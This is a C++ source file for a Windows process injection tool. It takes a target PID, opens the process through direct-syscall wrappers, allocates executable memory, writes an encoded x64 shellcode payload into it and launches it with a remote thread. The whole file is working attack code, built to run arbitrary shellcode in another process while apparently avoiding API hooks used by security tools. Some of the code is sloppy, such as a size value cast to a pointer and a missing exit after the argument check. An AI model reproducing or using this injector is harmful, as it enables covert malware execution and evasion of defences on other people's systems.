#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include "NativeFunctions.h"


int main(int argc, char** argv) {
	HANDLE hProc = NULL;
	OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };

	if (argc < 2) {
		printf("You need to pass the PID\n");
	}
	DWORD PID = atoi(argv[1]);

	PVOID baseaddr = NULL;
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x09\xa6\xb1\xe2\x2c\x98\x56\x46\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf5\xee\x32"
		"\x06\xdc\x70\x96\x46\x09\xa6\xf0\xb3\x6d\xc8\x04\x17\x5f"
		"\xee\x80\x30\x49\xd0\xdd\x14\x69\xee\x3a\xb0\x34\xd0\xdd"
		"\x14\x29\xee\x3a\x90\x7c\xd0\x59\xf1\x43\xec\xfc\xd3\xe5"
		"\xd0\x67\x86\xa5\x9a\xd0\x9e\x2e\xb4\x76\x07\xc8\x6f\xbc"
		"\xa3\x2d\x59\xb4\xab\x5b\xe7\xe0\xaa\xa7\xca\x76\xcd\x4b"
		"\x9a\xf9\xe3\xfc\x13\xd6\xce\x09\xa6\xb1\xaa\xa9\x58\x22"
		"\x21\x41\xa7\x61\xb2\xa7\xd0\x4e\x02\x82\xe6\x91\xab\x2d"
		"\x48\xb5\x10\x41\x59\x78\xa3\xa7\xac\xde\x0e\x08\x70\xfc"
		"\xd3\xe5\xd0\x67\x86\xa5\xe7\x70\x2b\x21\xd9\x57\x87\x31"
		"\x46\xc4\x13\x60\x9b\x1a\x62\x01\xe3\x88\x33\x59\x40\x0e"
		"\x02\x82\xe6\x95\xab\x2d\x48\x30\x07\x82\xaa\xf9\xa6\xa7"
		"\xd8\x4a\x0f\x08\x76\xf0\x69\x28\x10\x1e\x47\xd9\xe7\xe9"
		"\xa3\x74\xc6\x0f\x1c\x48\xfe\xf0\xbb\x6d\xc2\x1e\xc5\xe5"
		"\x86\xf0\xb0\xd3\x78\x0e\x07\x50\xfc\xf9\x69\x3e\x71\x01"
		"\xb9\xf6\x59\xec\xaa\x96\x99\x56\x46\x09\xa6\xb1\xe2\x2c"
		"\xd0\xdb\xcb\x08\xa7\xb1\xe2\x6d\x22\x67\xcd\x66\x21\x4e"
		"\x37\x97\x68\xe3\xe4\x5f\xe7\x0b\x44\xb9\x25\xcb\xb9\xdc"
		"\xee\x32\x26\x04\xa4\x50\x3a\x03\x26\x4a\x02\x59\x9d\xed"
		"\x01\x1a\xd4\xde\x88\x2c\xc1\x17\xcf\xd3\x59\x64\x81\x4d"
		"\xf4\x35\x68\x6c\xde\xd4\xe2\x2c\x98\x56\x46";

	//DWORD PID = 10132;
	CLIENT_ID CID = { (HANDLE)PID, 0 };


	printf("Opening handle in PID - %d\n", CID.UniqueProcess);
	SysNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &OA, &CID);
	if (hProc == NULL) {
		printf("Handle error 0x % lx", GetLastError());
		return -1;
	}



	printf("Handle opened in [%p]\n", hProc);

	SysNtAllocateVirtualMemory(&hProc, &baseaddr, 0, (PULONG)500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	SysNtWriteVirtualMemory(&hProc,baseaddr, (PVOID)shellcode, sizeof(shellcode), NULL);
	
	PHANDLE pThread = NULL;

	SysNtCreateThreadEx(pThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)baseaddr, NULL, FALSE, 0, 0, 0, NULL);
	


	CloseHandle(hProc);
	

	(void)getchar();
	return 0;

}